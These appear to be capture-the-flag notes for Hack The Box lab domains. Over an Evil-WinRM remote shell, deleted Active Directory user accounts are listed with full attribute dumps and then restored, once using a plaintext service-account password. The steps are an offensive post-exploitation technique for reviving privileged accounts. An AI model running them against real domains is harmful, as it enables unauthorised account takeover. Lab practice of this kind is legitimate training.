```bash
*Evil-WinRM* PS C:\windows\tasks> Get-ADObject -IncludeDeletedObjects -Filter 'IsDeleted -eq $true -and ObjectClass -eq "user"' -Properties *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
CN                              : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
codePage                        : 0
countryCode                     : 0
Created                         : 11/15/2024 7:55:59 PM
createTimeStamp                 : 11/15/2024 7:55:59 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/15/2024 7:56:05 PM, 11/15/2024 7:56:02 PM, 12/31/1600 7:00:01 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/15/2024 7:57:59 PM
modifyTimeStamp                 : 11/15/2024 7:57:59 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1109
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133761921597856970
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 12975
uSNCreated                      : 12844
whenChanged                     : 11/15/2024 7:57:59 PM
whenCreated                     : 11/15/2024 7:55:59 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
CN                              : cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:04:05 PM
createTimeStamp                 : 11/16/2024 12:04:05 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:04:18 PM, 11/16/2024 12:04:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:04:21 PM
modifyTimeStamp                 : 11/16/2024 12:04:21 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1110
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762502455822446
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13171
uSNCreated                      : 13161
whenChanged                     : 11/16/2024 12:04:21 PM
whenCreated                     : 11/16/2024 12:04:05 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
CN                              : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:07:27 PM
modifyTimeStamp                 : 11/16/2024 12:07:27 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762504248946345
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13197
uSNCreated                      : 13186
whenChanged                     : 11/16/2024 12:07:27 PM
whenCreated                     : 11/16/2024 12:07:04 PM
```

Restore AD User:

```bash
*Evil-WinRM* PS C:\windows\tasks> Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb" -TargetPath "OU=ADCS,DC=tombwatcher,DC=htb"
```


From another user:
```bash
$cred = [PSCredential]::new("svc_ldap@voleur.htb", (ConvertTo-SecureString "M1XyC9pW7qT5Vn" -AsPlainText -Force))
```


Enumerate:

```bash
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> Get-ADObject -IncludeDeletedObjects -Filter 'IsDeleted -eq $true -and ObjectClass -eq "user"' -Properties * -Credential $cred


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : voleur.htb/Deleted Objects/Todd Wolfe
                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
CN                              : Todd Wolfe
                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
codePage                        : 0
countryCode                     : 0
Created                         : 1/29/2025 1:08:06 AM
createTimeStamp                 : 1/29/2025 1:08:06 AM
Deleted                         : True
Description                     : Second-Line Support Technician
DisplayName                     : Todd Wolfe
DistinguishedName               : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
dSCorePropagationData           : {5/13/2025 4:11:10 PM, 1/29/2025 4:52:29 AM, 1/29/2025 4:49:29 AM, 1/29/2025 1:08:06 AM...}
givenName                       : Todd
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Second-Line Support Technicians,DC=voleur,DC=htb
lastLogoff                      : 0
lastLogon                       : 133826301603754403
lastLogonTimestamp              : 133826287869758230
logonCount                      : 3
memberOf                        : {CN=Second-Line Technicians,DC=voleur,DC=htb, CN=Remote Management Users,CN=Builtin,DC=voleur,DC=htb}
Modified                        : 5/13/2025 4:11:17 PM
modifyTimeStamp                 : 5/13/2025 4:11:17 PM
msDS-LastKnownRDN               : Todd Wolfe
Name                            : Todd Wolfe
                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 1c6b1deb-c372-4cbb-87b1-15031de169db
objectSid                       : S-1-5-21-3927696377-1337352550-2781715495-1110
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133826280731790960
sAMAccountName                  : todd.wolfe
sDRightsEffective               : 0
sn                              : Wolfe
userAccountControl              : 66048
userPrincipalName               : todd.wolfe@voleur.htb
uSNChanged                      : 45088
uSNCreated                      : 12863
whenChanged                     : 5/13/2025 4:11:17 PM
whenCreated                     : 1/29/2025 1:08:06 AM
```

Restore: 

```bash
Restore-ADObject -Identity "CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb" -TargetPath "OU=Second-Line Support Technicians,DC=voleur,DC=htb" -Credential $cred
```